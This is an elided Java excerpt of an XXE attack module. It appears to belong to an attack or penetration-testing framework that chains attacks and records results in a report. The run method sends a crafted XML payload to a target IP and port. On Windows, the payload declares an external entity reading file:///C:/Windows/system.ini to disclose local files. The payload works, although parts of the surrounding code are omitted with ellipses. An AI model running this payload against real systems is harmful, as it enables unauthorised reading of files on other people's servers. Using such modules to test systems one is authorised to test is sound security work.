...
public class XXEAttack implements Attack {
    ...
    public void run(Report report, String ip, int port) {
        try {
            System.out.println("Step 1: Initializing XXE Attack");
            ...
            if (osName.contains("win")) {
                maliciousXml = "<?xml version=\"1.0\" encoding=\"UTF-8\"?>"
                        + "<!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM \"file:///C:/Windows/system.ini\" >]>"
                        + "<foo>&xxe;</foo>";
            ...
            System.out.println("Step 7: XXE Attack successful!");
            report.append("XXE Attack successful!");
        } catch (Exception e) {
            System.out.println("XXE Attack failed: " + e.getMessage());
            report.append("XXE Attack failed: " + e.getMessage());
        }
    }

    @Override
    public List<Class<? extends Attack>> getRequiredPreviousAttacks() {
        // Prior attacks required for this XXE attack
